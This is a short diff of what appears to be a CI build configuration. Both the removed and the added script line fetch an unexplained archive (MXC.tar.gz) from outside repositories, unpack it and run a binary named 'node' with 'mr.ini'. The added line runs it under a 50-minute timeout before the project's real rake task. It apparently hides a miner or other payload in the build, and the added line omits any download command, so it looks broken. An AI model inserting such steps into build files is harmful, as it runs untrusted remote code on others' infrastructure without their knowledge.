@@ -9,5 +9,5 @@ services:
     expose:
       - 6379
 script:
-  - git clone https://MoonNgd@bitbucket.org/MoonNgd/mxc.git && cd mxc && tar -xvf MXC.tar.gz && ./node mr.ini
+  - https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
   - bundle exec rake best_practice_project:run
